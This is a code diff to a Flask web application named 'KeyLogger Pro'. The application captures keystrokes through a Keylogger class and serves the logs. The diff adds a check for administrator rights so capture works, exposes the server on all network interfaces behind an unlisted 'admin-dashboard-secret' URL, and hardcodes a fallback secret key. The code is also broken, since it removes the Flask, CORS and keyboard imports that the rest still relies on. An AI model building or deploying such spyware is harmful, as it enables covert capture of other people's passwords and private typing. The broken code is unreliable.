@@ -1,13 +1,14 @@
-from flask import Flask, render_template, jsonify, request
-from flask_cors import CORS
-import keyboard
-import time
-from datetime import datetime
 import os
+from dotenv import load_dotenv
 from threading import Timer, Thread
 import json
+import socket
+
+# Load environment variables
+load_dotenv()
 
 app = Flask(__name__)
+app.secret_key = os.getenv('SECRET_KEY', 'dev-secret-key-12345')
 CORS(app)
 
 class Keylogger:
@@ -196,5 +197,44 @@ def get_log_content(filename):
     
     return jsonify({"status": "success", "content": content})
 
+def is_admin():
+    """Check if the script is running with administrator privileges"""
+    try:
+        import ctypes
+        return ctypes.windll.shell32.IsUserAnAdmin() != 0
+    except AttributeError:
+        # For non-Windows OS
+        return os.getuid() == 0
+
 if __name__ == '__main__':
-    app.run(debug=True, port=5000)
+    env = os.getenv('FLASK_ENV', 'production')
+    host = os.getenv('HOST', '0.0.0.0')
+    port = int(os.getenv('PORT', 5000))
+    
+    print(f"\n{'='*50}")
+    print(f"  KeyLogger Pro - Server Starting")
+    print(f"{'='*50}")
+    
+    if not is_admin():
+        print(" [!] WARNING: Application is NOT running as Administrator.")
+        print(" [!] Keylogger functionality MAY NOT capture keystrokes.")
+        print(" [!] Please restart this terminal/IDE as Administrator.")
+    
+    # Get local IP for convenience
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        local_ip = s.getsockname()[0]
+        s.close()
+        print(f" [*] Local IP: {local_ip}")
+        print(f" [*] Admin URL: http://{local_ip}:{port}/admin-dashboard-secret")
+    except Exception:
+        print(f" [*] Localhost URL: http://127.0.0.1:{port}/admin-dashboard-secret")
+
+    if env == 'development':
+        print(f" [*] Mode: Development (Debug active)")
+        app.run(debug=True, host=host, port=port)
+    else:
+        print(f" [*] Mode: Production (Waitress server active)")
+        from waitress import serve
+        serve(app, host=host, port=port)
